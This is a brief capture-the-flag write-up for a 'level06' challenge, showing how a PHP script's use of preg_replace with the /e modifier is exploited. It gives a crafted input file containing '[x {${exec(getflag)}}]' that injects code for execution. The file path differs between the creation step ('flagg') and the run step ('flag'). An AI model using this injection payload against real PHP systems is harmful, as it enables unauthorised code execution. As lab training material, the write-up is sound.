# The PHP script takes two arguments on the command line.
```bash
cat level06.php
```

- Function y($m) takes a string $m as input and modifies it by replacing:
    - Each '.' with 'x'
    - Each '@' with 'y'
    - The function then returns the modified string.

- Function x($y, $z) takes two parameters:
    - It opens a file whose path is specified by $y, reads its contents, and performs several modifications.

- Note: The function preg_replace with the /e option has some vulnerabilities.

# Since I don't have permission to create folders, we'll create a script in the symbolic link of shared files: /dev/shm/

# Create a file in /dev/shm/: 
cat > /dev/shm/flagg

# Content of the created file:
[x {${exec(getflag)}}]

# We created a file containing a string to be processed by the PHP script. 

# The script will search for "x" and then execute what's inside the curly braces: ${exec(getflag)}.

# Execute the PHP script:
./level06 /dev/shm/flag
